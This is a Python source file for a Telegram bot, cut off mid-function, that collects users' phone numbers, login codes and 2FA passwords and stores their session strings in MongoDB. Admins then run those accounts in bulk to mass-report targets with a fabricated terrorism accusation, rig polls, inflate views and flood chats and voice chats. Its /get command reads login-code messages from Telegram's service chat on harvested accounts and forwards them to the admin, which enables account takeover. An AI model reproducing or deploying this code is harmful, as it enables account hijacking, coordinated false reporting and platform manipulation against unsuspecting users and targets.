# Standard library imports
import asyncio
import gc
import json
import logging
import os
import random
import resource
import shutil
import subprocess
import sys
import time
from datetime import datetime
from typing import Dict, Optional

# Third-party imports
import certifi
import psutil
import pymongo
from pytgcalls import PyTgCalls, filters as fl
from pytgcalls.types import MediaStream

# Pyrogram imports
from pyrogram import Client, filters
from pyrogram.handlers import MessageHandler
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.raw import functions, types
from pyrogram.raw.types import InputReportReasonOther
from pyrogram.errors import (
    SessionPasswordNeeded, PasswordHashInvalid, PhoneCodeInvalid,
    AuthKeyDuplicated, AuthKeyUnregistered, SessionRevoked,
    ChatForwardsRestricted, PeerFlood, UserRestricted,
    FileReferenceExpired, UserDeactivatedBan, UserAlreadyParticipant,
    PeerIdInvalid, UserDeactivated, AuthKeyInvalid, AuthTokenExpired,
    AccessTokenExpired
)

# MongoDB setup
MONGODB_URI = os.getenv('MONGODB_URI')
if not MONGODB_URI:
    raise RuntimeError('Missing required environment variable: MONGODB_URI')

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# MongoDB connection with optimized connection pooling for long-running stability
mongo_client = pymongo.MongoClient(
    MONGODB_URI, 
    tlsCAFile=certifi.where(),
    maxPoolSize=20,
    minPoolSize=2,
    maxIdleTimeMS=45000,
    serverSelectionTimeoutMS=5000,
    connectTimeoutMS=10000,
    socketTimeoutMS=30000,
    retryWrites=True,
    retryReads=True,
    maxConnecting=2
)
db = mongo_client['voice']
user_sessions = db['user_sessions']

# Create index on user_id for faster queries
try:
    user_sessions.create_index("user_id", unique=True)
    logger.info("Database index created successfully")
except Exception as e:
    logger.warning(f"Index creation failed or already exists: {e}")

# Global state
StartTime = time.time()
clients: Dict[int, Client] = {}  # Dictionary to store client objects
songs_client: Dict[int, PyTgCalls] = {}
admin_comments: Dict[int, list] = {}
cancel_process: Dict[int, bool] = {}
add_handlers: Dict[int, MessageHandler] = {}  # active /add capture handlers per admin
ADD_IDLE_TIMEOUT = 2  # seconds of inactivity before the /add status message is sent
login_states: Dict[int, dict] = {}   # tracks per-user /login flow (step + client)
logout_pending: Dict[int, bool] = {}  # users awaiting LOGOUT confirmation

# Simple cache for user sessions (reduces DB queries)
session_cache: Dict[int, tuple] = {}  # (user_data, timestamp)
CACHE_EXPIRY = 3600  # 1 hour

# Memory management settings
MEMORY_CLEANUP_INTERVAL = 1800  # 30 minutes
CACHE_CLEANUP_INTERVAL = 3600  # 1 hour
last_memory_cleanup = time.time()
last_cache_cleanup = time.time()
# Load configuration from OS environment only (no .env/dotenv)
# Required environment variables: API_ID (int), API_HASH, BOT_TOKEN
_api_id = os.getenv('API_ID')
if _api_id is None:
    raise RuntimeError('Missing required environment variable: API_ID')
try:
    API_ID = int(_api_id)
except ValueError:
    raise RuntimeError('API_ID must be an integer')

API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')

if API_HASH is None or BOT_TOKEN is None:
    raise RuntimeError('Missing required environment variables: API_HASH and BOT_TOKEN')

# Optional OWNER username or ID from environment
OWNER = os.getenv('OWNER', '(not set)')

# Optional ADMIN_IDS as CSV from environment (e.g. "123,456")
_admin_ids = os.getenv('ADMIN_IDS', '')
if _admin_ids:
    try:
        ADMIN_IDS = [int(x.strip()) for x in _admin_ids.split(',') if x.strip()]
    except ValueError:
        raise RuntimeError('ADMIN_IDS must be a comma-separated list of integers')
else:
    ADMIN_IDS = []
# Initialize bot clients
app = Client(
    ":hehe",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    in_memory=True,
    workdir=".",
    sleep_threshold=60,
    takeout=False
)

# ==================== Helper Functions ====================

def is_admin(user_id: int) -> bool:
    """Check if user is an admin"""
    return user_id in ADMIN_IDS

async def cleanup_memory():
    """Periodic memory cleanup to prevent leaks"""
    global last_memory_cleanup
    current_time = time.time()
    
    if current_time - last_memory_cleanup > MEMORY_CLEANUP_INTERVAL:
        logger.info("Running memory cleanup...")
        gc.collect()
        last_memory_cleanup = current_time
        logger.info("Memory cleanup completed")

async def cleanup_cache():
    """Cleanup expired cache entries"""
    global last_cache_cleanup
    current_time = time.time()
    
    if current_time - last_cache_cleanup > CACHE_CLEANUP_INTERVAL:
        logger.info("Running cache cleanup...")
        expired_keys = [k for k, (_, ts) in session_cache.items() if current_time - ts > CACHE_EXPIRY]
        for key in expired_keys:
            del session_cache[key]
        last_cache_cleanup = current_time
        logger.info(f"Cache cleanup completed, removed {len(expired_keys)} entries")

async def get_cached_user_session(user_id: int):
    """Get user session with caching to reduce DB queries"""
    current_time = time.time()
    
    # Check if in cache and not expired
    if user_id in session_cache:
        session_data, timestamp = session_cache[user_id]
        if current_time - timestamp < CACHE_EXPIRY:
            return session_data
        else:
            # Remove expired cache entry
            del session_cache[user_id]
    
    # Query database with timeout
    try:
        user_data = user_sessions.find_one({"user_id": user_id}, max_time_ms=5000)
    except Exception as e:
        logger.error(f"Database query timeout for user {user_id}: {e}")
        return None
    
    # Cache the result
    if user_data:
        session_cache[user_id] = (user_data, current_time)
    
    return user_data

async def get_or_join_chat(client, identifier: str):
    """Get chat or join if not already a member with timeout"""
    print(f"[get_or_join_chat] Attempting to get chat: {identifier}")
    try:
        chat = await asyncio.wait_for(client.get_chat(identifier), timeout=15)
        print(f"[get_or_join_chat] Successfully retrieved chat: {identifier}")
        return chat
    except asyncio.TimeoutError:
        print(f"[get_or_join_chat] Timeout getting chat {identifier}")
        raise
    except Exception as e:
        print(f"[get_or_join_chat] Failed to get chat {identifier}, attempting to join. Error: {e}")
        try:
            chat = await asyncio.wait_for(client.join_chat(identifier), timeout=15)
            print(f"[get_or_join_chat] Successfully joined chat: {identifier}")
            return chat
        except asyncio.TimeoutError:
            print(f"[get_or_join_chat] Timeout joining chat {identifier}")
            raise
        except Exception as join_error:
            print(f"[get_or_join_chat] Failed to join chat {identifier}. Error: {join_error}")
            raise

async def safe_view_messages(client, chat_id: int, message_id: int, event=None):
    """Safely increment view count for messages"""
    try:
        await client.view_messages(chat_id, message_id)
    except Exception as e:
        logger.warning(f"Failed to view message {message_id} in chat {chat_id}: {e}")
        if event:
            await event.reply(f"⚠️ Failed to increment view count: {e}")

async def inform_admin(user_id: int, error: Exception):
    """Helper function to inform all admins about an exception"""
    logger.error(f"Error with user {user_id}: {error}")
    for admin_id in ADMIN_IDS:
        try:
            await app.send_message(admin_id, f"⚠️ Error starting client for user `{user_id}`: {error}")
        except Exception as e:
            logger.error(f"Failed to inform admin {admin_id}: {e}")

async def get_readable_time(seconds: int) -> str:
    count = 0
    up_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "days"]

    while count < 4:
        count += 1
        remainder, result = divmod(seconds, 60) if count < 3 else divmod(seconds, 24)
        if seconds == 0 and remainder == 0:
            break
        time_list.append(int(result))
        seconds = int(remainder)

    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        up_time += time_list.pop() + ", "

    time_list.reverse()
    up_time += ":".join(time_list)

    return up_time

# ==================== Command Handlers ====================

@app.on_message(filters.command("ping"))
async def ping_command(client, message):
    # Calculate uptime
    uptime = await get_readable_time((time.time() - StartTime))
    start = datetime.now()
    
    # Simulate progress bar with fewer edits (reduce API calls)
    xx = await message.reply("**0% ▒▒▒▒▒▒▒▒▒▒**")
    await xx.edit("**50% █████▒▒▒▒▒**")
    await xx.edit("**100% ██████████**")
    
    # Calculate the duration
    end = datetime.now()
    
    # Get system resources (use interval=0.1 for faster CPU sampling)
    delta_ping = (end - start).microseconds / 1000
    delta_ping_formatted = round(delta_ping, 3)
    cpu = psutil.cpu_percent(interval=0.1)  # Reduce sample interval from blocking
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage("/").percent
    process = psutil.Process(os.getpid())
    
    # Get file descriptor limits (avoid expensive open_files() call)
    soft_limit, hard_limit = resource.getrlimit(resource.RLIMIT_NOFILE)
    try:
        if os.path.exists(f'/proc/{os.getpid()}/fd'):
            current_fds = len(os.listdir(f'/proc/{os.getpid()}/fd'))
        else:
            current_fds = "N/A"
    except:
        current_fds = "N/A"
    
    _ping = f"""<blockquote><b>🏓 PING:</b> {str(delta_ping_formatted).replace('.', ',')} ms
<b>⏱ UPTIME:</b> {uptime}
<b>👑 OWNER:</b> {OWNER}

<b>📊 Server Stats:</b>
🚀 <b>CPU:</b> {cpu}%
🧹 <b>RAM:</b> {mem}%
💾 <b>DISK:</b> {disk}%
🧠 <b>MEMORY:</b> {round(process.memory_info()[0] / 1024 ** 2)} MB

<b>📁 File Descriptors:</b>
🔹 <b>Current:</b> {current_fds}
🔹 <b>Soft Limit:</b> {soft_limit}
🔹 <b>Hard Limit:</b> {hard_limit}</blockquote>"""
    await xx.edit(_ping)

# ==================== Login / Logout Flow ====================

LOGIN_SUCCESS_TEXT = (
    "✅ **Login Successful!**\n\nYou now have full access to the bot's features.\n\n"
    "📋 **Rules & Guidelines:**\n"
    "• 🛑 **No Spamming:** Do not send spam or mass requests. Account restrictions may occur.\n"
    "• 🚫 **Copyright Respect:** Do not distribute copyrighted material.\n"
    "• ⚠️ **User Responsibility:** You are responsible for all actions taken via your session.\n\n"
    "By continuing to use this bot, you agree to these terms."
)


@app.on_message(filters.command("login") & filters.private)
async def login_command(client, message):
    sender = message.from_user.id

    # Check if user already exists
    existing_user = user_sessions.find_one({"user_id": sender})
    if existing_user:
        return await message.reply(
            "ℹ️ **You are already logged in!**\n\nIf you wish to log out, use the /logout command."
        )

    login_states[sender] = {"step": "phone"}
    await message.reply(
        "📱 **Login Request**\n\nPlease send your **phone number** (with country code) to proceed with verification.\n\n"
        "*Example:* `+11234567890`"
    )


async def _handle_login_phone(message):
    sender = message.from_user.id
    state = login_states[sender]

    phone_number = (message.text or "").strip()
    if not phone_number:
        return await message.reply("⚠️ Please send your phone number with country code (e.g. `+11234567890`).")
    if not phone_number.startswith("+"):
        phone_number = "+" + phone_number

    try:
        clients[sender] = Client(
            f"user_{sender}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
            workers=2,
            sleep_threshold=60,
            max_concurrent_transmissions=2,
        )
        client = clients[sender]
        await client.connect()
        sent_code = await client.send_code(phone_number)
        print(f"Code sent to {phone_number}.")

        state.update({
            "step": "code",
            "phone_number": phone_number,
            "phone_code_hash": sent_code.phone_code_hash,
        })
        await message.reply(
            "🔢 **Enter Login Code**\n\nPlease send the verification code with spaces between each digit.\n\n"
            "*Example:* `1 2 3 4 5`\n\n"
            "*(This format is required due to Telegram's security restrictions.)*",
        )
    except Exception as e:
        login_states.pop(sender, None)
        try:
            c = clients.pop(sender, None)
            if c:
                await c.disconnect()
        except Exception:
            pass
        await message.reply(
            f"⚠️ **Error Sending Code:** {e}\n\nPlease try again later using /login.",
        )


async def _finalize_login(message, client, sender):
    await message.reply(LOGIN_SUCCESS_TEXT)
    string_session = await client.export_session_string()
    user_sessions.update_one(
        {"user_id": sender},
        {"$set": {"string_session": string_session}},
        upsert=True,
    )
    await client.disconnect()
    login_states.pop(sender, None)
    clients.pop(sender, None)
    await run_client(sender)


async def _handle_login_code(message):
    sender = message.from_user.id
    state = login_states[sender]
    client = clients.get(sender)
    code = (message.text or "").replace(" ", "")

    try:
        await client.sign_in(state["phone_number"], state["phone_code_hash"], code)
        await _finalize_login(message, client, sender)
    except PhoneCodeInvalid:
        await message.reply("❌ **Incorrect Code:** The verification code you entered is invalid. Please try again.")
    except SessionPasswordNeeded:
        state["step"] = "password"
        await message.reply(
            "🔐 **2FA Password Required:**\n\nYour account is protected with Two-Step Verification. "
            "Please enter your 2FA password:"
        )
    except Exception as e:
        login_states.pop(sender, None)
        try:
            c = clients.pop(sender, None)
            if c:
                await c.disconnect()
        except Exception:
            pass
        await message.reply(f"⚠️ **Login Error:** {e}\n\nPlease try again using /login.")


async def _handle_login_password(message):
    sender = message.from_user.id
    client = clients.get(sender)
    password = (message.text or "").strip()

    try:
        await client.check_password(password)
        await _finalize_login(message, client, sender)
    except PasswordHashInvalid:
        await message.reply("❌ **Incorrect Password:** The 2FA password you entered is incorrect. Please try again.")
    except Exception as e:
        login_states.pop(sender, None)
        try:
            c = clients.pop(sender, None)
            if c:
                await c.disconnect()
        except Exception:
            pass
        await message.reply(f"⚠️ **Login Error:** {e}\n\nPlease try again using /login.")


@app.on_message(filters.command("logout") & filters.private)
async def logout_command(client, message):
    sender = message.from_user.id

    user_data = user_sessions.find_one({"user_id": sender})
    if user_data:
        logout_pending[sender] = True
        await message.reply(
            "⚠️ **Logout Confirmation**\n\nAre you sure you want to log out? Reply with `LOGOUT` to confirm."
        )
    else:
        await message.reply(
            "⚠️ **No Active Session:** No login session was found for your account. Use /login to log in."
        )


async def _handle_logout_confirmation(message):
    sender = message.from_user.id
    text = (message.text or "").strip().upper()

    if text == "LOGOUT":
        logout_pending.pop(sender, None)
        user_sessions.delete_one({"user_id": sender})
        await message.reply("✅ **Logged Out:** Your session has been removed successfully.")

        # Stop any running voice-chat / user client for this user
        try:
            if sender in songs_client:
                await songs_client[sender].stop()
                songs_client.pop(sender, None)
        except Exception as e:
            logger.warning(f"Failed to stop PyTgCalls for {sender}: {e}")

        client = clients.pop(sender, None)
        if client:
            try:
                await client.log_out()
            except Exception as e:
                logger.warning(f"Failed to log out client {sender}: {e}")

        if os.path.exists(f"user{sender}.session"):
            os.remove(f"user{sender}.session")
            await message.reply("🗑️ Local session file cleaned up successfully.")
    else:
        logout_pending.pop(sender, None)
        await message.reply("❌ **Logout Cancelled:** You remain logged in.")

@app.on_message(filters.command("start"))
async def start_command(client, message):
    user_id = message.from_user.id
    response = (
        "🤖 **Available Commands**\n\n"
        "🔑 **Authentication & System:**\n"
        "• `/login` - Log in your client account\n"
        "• `/logout` - Log out your client account\n"
        "• `/ping` - Check bot latency and server stats\n"
        "• `/activers` - View all active user clients\n"
        "• `/reboot` - Restart the bot system\n"
        "• `/pull` - Pull updates from repository\n\n"
        "💬 **Chat & Voice Chat Management:**\n"
        "• `/join [count] [chat]` - Join a chat with multiple clients\n"
        "• `/left [count] [chat]` - Leave a chat with multiple clients\n"
        "• `/vc [count] [chat]` - Join a voice chat with clients\n"
        "• `/leave [count] [chat]` - Leave a voice chat with clients\n\n"
        "💬 **Comment System:**\n"
        "• `/add` - Reply to a message to save it as a comment\n"
        "• `/comments` - View all added comments\n"
        "• `/clear` - Clear all pending comments\n"
        "• `/comment [chat] [msg_id] [delay]` - Post comments to a post\n"
        "• `/cancel` - Cancel active commenting process\n\n"
        "📊 **Poll & Interaction:**\n"
        "• `/vote [option] [count] [msg_id] [chat] [delay]` - Vote in a poll\n"
        "• `/bvote [option] [count] [msg_id] [chat] [delay]` - Click inline poll button\n"
        "• `/react [count] [chat] [msg_id] [emoji]` - React to a message\n"
        "• `/report [count] [target]` - Report a user/channel"
    )
    await message.reply(response)


@app.on_message(filters.command("leave"))
async def leave_voice_chat(client, message):
    if not is_admin(message.from_user.id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
    
    import re
    match = re.match(r'/leave(?:@\w+)?\s+(\d+)\s+(\S+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/leave [count] [chat]`\n*Example:* `/leave 5 @groupusername`")
    
    num_clients_to_leave = int(match.group(1))
    group_identifier = match.group(2)
    left_users = 0

    await message.reply(f"🚀 **Starting Task:** Leaving voice chat with up to {num_clients_to_leave} client(s)...")

    for sender in list(songs_client.keys()):
        if left_users >= num_clients_to_leave:
            break
            
        call_py = songs_client.get(sender)
        user_client = clients.get(sender)
        try:
            chat_id = int(group_identifier) if group_identifier.isdigit() else (await user_client.get_chat(group_identifier)).id
            await call_py.leave_call(chat_id)
            left_users += 1
            print(f"{user_client} left the voice chat.")
        except Exception as e:
            print(e)

    await message.reply(f"🔊 Successfully left {left_users} client(s) from the voice chat.")



@app.on_message(filters.command("report"))
async def report_peer(client, message):
    if not is_admin(message.from_user.id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
    
    import re
    match = re.match(r'/report(?:@\w+)?\s+(\d+)\s+(\S+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/report [count] [target]`\n*Example:* `/report 5 @username`")
    
    num_clients_to_report = int(match.group(1))
    group_identifier = match.group(2)
    reported_users = 0

    report_message = (
        "This person spreads fake news, misleads people, thereby inciting aggression "
        "and calling for war between nations. It sends photos with violent threats to the life "
        "Under international law, this is regarded as terrorism. "
        "Therefore we ask You to block it as soon as possible!"
    )

    await message.reply(f"🚀 **Starting Task:** Reporting target `{group_identifier}` with up to {num_clients_to_report} client(s)...")

    for sender in list(songs_client.keys()):
        if reported_users >= num_clients_to_report:
            break
            
        user_client = clients.get(sender)
        try:
            peer = await user_client.resolve_peer(group_identifier)
            report = functions.account.ReportPeer(peer=peer, reason=InputReportReasonOther(), message=report_message)
            await user_client.invoke(report)
            reported_users += 1
            print(f"{user_client} reported the {group_identifier}.")
        except Exception as e:
            print(e)

    await message.reply(f"🚩 Reported target successfully with {reported_users} client(s).")


@app.on_message(filters.command("bview"))
async def increment_views(client, message):
    if not is_admin(message.from_user.id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")

    import re
    match = re.match(r'/bview(?:@\w+)?\s+(\d+)\s+(\S+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/bview [count] [join_url]`\n*Example:* `/bview 5 https://t.me/channel`")

    num_clients_to_view = int(match.group(1))
    join_url = match.group(2)
    viewed_users = 0

    await message.reply(f"🚀 **Starting Task:** Incrementing views with up to {num_clients_to_view} client(s)...")

    for sender in list(songs_client.keys()):
        if viewed_users >= num_clients_to_view:
            break
            
        user_client = clients.get(sender)
        try:
            chat = await get_or_join_chat(user_client, join_url)
            async for msg in user_client.get_chat_history(chat.id, 20):
                try:
                    await user_client.view_messages(chat.id, msg.id)
                except Exception as e:
                    await message.reply(f"⚠️ Client `{sender}` failed to view message `{msg.id}`: {e}")
                    break
            viewed_users += 1
        except Exception as e:
            await message.reply(f"⚠️ Client `{sender}` error: {e}")

    await message.reply(f"👁️ Successfully incremented views with {viewed_users}/{num_clients_to_view} client(s).")

@app.on_message(filters.command("left"))
async def leave_chat_handler(client, message):
    if not is_admin(message.from_user.id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
    
    import re
    match = re.match(r'/left(?:@\w+)?\s+(\d+)\s+(\S+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/left [count] [chat]`\n*Example:* `/left 5 @groupusername`")

    num_clients_to_leave = int(match.group(1))
    group_identifier = match.group(2)
    left_users = 0

    await message.reply(f"🚀 **Starting Task:** Leaving chat with up to {num_clients_to_leave} client(s)...")

    for sender in list(songs_client.keys()):
        if left_users >= num_clients_to_leave:
            break
            
        user_client = clients.get(sender)
        try:
            chat_id = int(group_identifier) if group_identifier.isdigit() else (await user_client.get_chat(group_identifier)).id
            await user_client.leave_chat(chat_id)
            left_users += 1
            print(f"{user_client} left the chat.")
        except Exception as e:
            print(e)

    await message.reply(f"🚪 Successfully left {left_users} client(s) from the chat.")


@app.on_message(filters.command("vote"))
async def vote_on_poll(client, message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
    
    await cleanup_memory()
    
    import re
    match = re.match(r'/vote(?:@\w+)?\s+(\d+)\s+(\d+)\s+(\d+)\s+(\S+)\s+(\d+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/vote [option] [count] [msg_id] [chat] [delay]`\n*Example:* `/vote 0 5 123 @chat 2`")

    poll_index = int(match.group(1))
    num_clients_to_vote = int(match.group(2))
    message_id = int(match.group(3))
    join_url = match.group(4)
    sleep_time = int(match.group(5))
    
    if not (0 <= poll_index <= 9):
        return await message.reply("⚠️ **Invalid Option Index:** Please provide a number between 0 and 9.")
    
    await message.reply(f"🚀 **Starting Task:** Voting option {poll_index + 1} with up to {num_clients_to_vote} client(s)...")

    voted_users = 0
    for sender in list(songs_client.keys()):
        if voted_users >= num_clients_to_vote:
            break
            
        user_client = clients.get(sender)
        try:
            chat = await get_or_join_chat(user_client, join_url)
            await user_client.vote_poll(chat.id, message_id, poll_index)
            await safe_view_messages(user_client, chat.id, message_id, message)
            voted_users += 1
            await message.reply(f"✅ Client `{sender}` voted for option {poll_index + 1}.")
            await asyncio.sleep(sleep_time)
        except Exception as e:
            await message.reply(f"⚠️ Client `{sender}` failed to vote: {e}")
    
    await message.reply(f"🗳️ Voting completed: {voted_users}/{num_clients_to_vote} client(s) voted.")
    

@app.on_message(filters.command("get"))
async def get_telegram_chat(client, message):
    if not is_admin(message.from_user.id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
    
    import re
    match = re.match(r'/get(?:@\w+)?\s+(\d+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/get [client_user_id]`\n*Example:* `/get 12345678`")

    target_id = int(match.group(1))
    user_client = clients.get(target_id)
    if user_client:
        async for msg in user_client.get_chat_history(777000, limit=5):
            if not msg.from_user.is_self and msg.text:
                await app.send_message(message.from_user.id, msg.text)

@app.on_message(filters.command("check"))
async def check_telegram_chat(client, message):
    if not is_admin(message.from_user.id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")

    try:
        for sender in list(songs_client.keys()):
            user_client = clients.get(sender)
            async for msg in user_client.get_chat_history(777000, limit=10):
                if not msg.from_user.is_self and msg.media:
                    await app.send_message(message.from_user.id, f"<blockquote>{user_client.me.first_name} ({sender})</blockquote> has media")
                    break
    except Exception as e:
        await app.send_message(message.from_user.id, str(e))

@app.on_message(filters.command("vc"))
async def join_voice_chat(client, message):
    if not is_admin(message.from_user.id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
    
    import re
    match = re.match(r'/vc(?:@\w+)?\s+(\d+)\s+(\S+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/vc [count] [chat]`\n*Example:* `/vc 5 @groupusername`")

    num_clients_to_join = int(match.group(1))
    group_invite_link = match.group(2)
    joined_users = 0

    await message.reply(f"🚀 **Starting Task:** Joining voice chat with up to {num_clients_to_join} client(s)...")

    for sender in list(songs_client.keys()):
        if joined_users >= num_clients_to_join:
            break
            
        call_py = songs_client.get(sender)
        user_client = clients.get(sender)
        try:
            chat = await get_or_join_chat(user_client, group_invite_link)
            await call_py.play(chat.id)
            await call_py.mute(chat.id)
            joined_users += 1
            print(f"{user_client} joined the voice chat.")
        except Exception as e:
            await message.reply(f"⚠️ Error joining voice chat with client `{sender}`: {e}")

    await message.reply(f"🔊 Successfully joined {joined_users} client(s) to the voice chat.")


@app.on_message(filters.command("join"))
async def join_chat(client, message):
    if not is_admin(message.from_user.id):
        return await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
    
    import re
    match = re.match(r'/join(?:@\w+)?\s+(\d+)\s+(\S+)', message.text)
    if not match:
        return await message.reply("⚠️ **Incorrect Usage!**\n\n📌 **Usage:** `/join [count] [chat]`\n*Example:* `/join 5 @groupusername`")

    num_clients_to_join = int(match.group(1))
    group_invite_link = match.group(2)
    joined_users = 0

    await message.reply(f"🚀 **Starting Task:** Joining chat with up to {num_clients_to_join} client(s)...")

    for sender in list(songs_client.keys()):
        if joined_users >= num_clients_to_join:
            break
            
        user_client = clients.get(sender)
        try:
            chat = await user_client.join_chat(group_invite_link)
            joined_users += 1
            print(f"{user_client} joined the chat.")
        except Exception as e:
            await message.reply(f"⚠️ Error joining chat with client `{sender}`: {e}")

    await message.reply(f"📥 Successfully joined {joined_users} client(s) to the chat.")

@app.on_message(filters.command("reboot"))
async def reboot_handler(client, message):
    if not is_admin(message.from_user.id):
        await message.reply("⛔ **Unauthorized:** You do not have permission to use this command.")
        return
    
    await message.reply("🔄 **Rebooting:** Admin command received. Shutting down bot processes...")
    sys.exit(0)

@app.on_message(filters.command("activers"))
async def handler(client, message):
    if not is_admin(message.from_user.id):
        return

    user_ids = list(songs_client.keys())
    num_active_clients = len(user_ids)
    response = "👥 **Active Clients List:**\n\n"
    
    for client_id in user_ids:
        try:
            user = await app.get_users(client_id)
            full_name = f"{user.first_name} {user.last_name or ''}".strip()
        except Exception as e:
            print(f"Error getting user details: {e}")
            full_name = "Unknown"
        response += f"[{full_name}](tg://user?id={client_id}) - {client_id}\n"

    response += f"\n📊 **Total Active Clients:** {num_active_clients}"

    # Send in chunks if too long
    max_length = 4000
    for i in range(0, len(response), max_length):
        await message.reply(response[i:i + max_length])
# ==================== Client Management ====================

async def run_client(sender: int):


    # Check if the sender's session exists
    user_data = user_sessions.find_one({"user_id": sender})
    if user_data:
        string_session = user_data.get("string_session")

        # Initialize the client with the retrieved data
        clients[sender] = Client(
            f"user_{sender}", 
            api_id=API_ID, 
            api_hash=API_HASH, 
            sleep_threshold=60, 
            session_string=string_session, 
            in_memory=True,
            workers=1,
            max_concurrent_transmissions=1
        )
        client = clients.get(sender)
        songs_client[sender]=PyTgCalls(client)
        call_py= songs_client.get(sender)
        await call_py.start()
    else:
        print("User session not found.")


async def periodic_maintenance():
    """Periodic maintenance tasks for long-running stability"""
    while True:
        try:
            await asyncio.sleep(1800)  # 30 minutes
            await cleanup_memory()
            await cleanup_cache()
            
            # Check for dead clients and clean up
            dead_clients = []
            for user_id, client in list(clients.items()):
                if not client.is_connected:
                    dead_clients.append(user_id)
                    logger.warning(f"Client {user_id} is disconnected")
            
            for user_id in dead_clients:
                try:
                    if user_id in songs_client:
                        await songs_client[user_id].stop()
                        del songs_client[user_id]
                    if user_id in clients:
                        await clients[user_id].stop()
                        del clients[user_id]
                    logger.info(f"Cleaned up dead client {user_id}")
                except Exception as e:
                    logger.error(f"Error cleaning up client {user_id}: {e}")
            
        except Exception as e:
            logger.error(f"Error in periodic maintenance: {e}")

async def run_all_clients():
    """Initialize and start all user clients from database"""
    try:
        await app.start()
        logger.info(f"Bot started: {app.me.username}")
        
        # Get all user IDs from database
        user_ids = user_sessions.distinct("user_id")
        logger.info(f"Found {len(user_ids)} user sessions to initialize")
        
        # Create tasks for all user clients with better error handling
        tasks = [asyncio.create_task(run_user_client(user_id)) for user_id in user_ids]
        
        # Gather all tasks and ignore individual failures
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Log any failures
        failed = sum(1 for r in results if isinstance(r, Exception))
        if failed:
            logger.warning(f"{failed}/{len(tasks)} clients failed to start")
        else:
            logger.info(f"All {len(tasks)} clients started successfully")
        
        # Start periodic maintenance task
        asyncio.create_task(periodic_maintenance())
        logger.info("Periodic maintenance task started")
        
    except Exception as e:
        logger.error(f"Error in run_all_clients: {e}", exc_info=True)


async def run_user_client(user_id: int):
    """Initialize and start a single user client with retry logic"""
    # Add random delay to avoid rate limits
    await asyncio.sleep(random.uniform(1, 3))
    
    max_retries = 3
    retry_delay = 5
    
    for attempt in range(max_retries):
        try:
            user_data = await get_cached_user_session(user_id)
            if not user_data:
                logger.warning(f"No session data found for user {user_id}")
                return
            
            string_session = user_data.get("string_session")
            if not string_session:
                logger.warning(f"No session string for user {user_id}")
                return

            # Initialize the client with optimized settings
            clients[user_id] = Client(
                f"user_{user_id}", 
                api_id=API_ID, 
                api_hash=API_HASH, 
                sleep_threshold=60,
                workers=1,
                max_concurrent_transmissions=1,
                session_string=string_session, 
                in_memory=True
            )
            client = clients[user_id]
            songs_client[user_id] = PyTgCalls(client)
            call_py = songs_client[user_id]
            
            # Test connection with timeout
            try:
                auth = await asyncio.wait_for(client.connect(), timeout=30)
            except asyncio.TimeoutError:
                logger.warning(f"Client {user_id} connection timeout on attempt {attempt + 1}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(retry_delay)
                    continue
                raise
            
            if not auth:
                logger.error(f"Client {user_id} is not authorized")
                user_sessions.delete_one({"user_id": user_id})
                return
            
            # Start call handler with timeout
            try:
                await asyncio.wait_for(call_py.start(), timeout=30)
            except asyncio.TimeoutError:
                logger.warning(f"Client {user_id} PyTgCalls start timeout on attempt {attempt + 1}")
                if attempt < max_retries - 1:
                    await asyncio.sleep(retry_delay)
                    continue
                raise
            
            logger.info(f"Client {user_id} started successfully")
            return
            
        except (SessionRevoked, UserDeactivatedBan, AuthKeyInvalid, AuthKeyUnregistered,
                AuthTokenExpired, AuthKeyDuplicated, AccessTokenExpired, UserDeactivated) as e:
            logger.error(f"Auth error for user {user_id}: {e}")
            await inform_admin(user_id, e)
            user_sessions.delete_one({"user_id": user_id})
            if user_id in clients:
                clients.pop(user_id)
            if user_id in songs_client:
                songs_client.pop(user_id)
            return
        except Exception as e:
            logger.error(f"Error starting client {user_id} (attempt {attempt + 1}): {e}")
            if attempt < max_retries - 1:
                await asyncio.sleep(retry_delay)
            else:
                await inform_admin(user_id, e)
                if user_id in clients:
                    clients.pop(user_id)
                if user_id in songs_client:
                    songs_client.pop(user_id)


# ==================== Comment System ====================

@app.on_message(filters.command("add"))
async def add_comment(client, message):
    """Start capturing comments: /add, then send text/stickers/GIFs. Auto-stops after inactivity."""
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.reply("⛔ **Unauthorized:** You do not have permission to perform this action.")
        return

    if user_id in add_handlers:
        await message.reply("🔄 **Already capturing.** Keep sending — I'll stop after a short pause.")
        return

    admin_comments.setdefault(user_id, [])
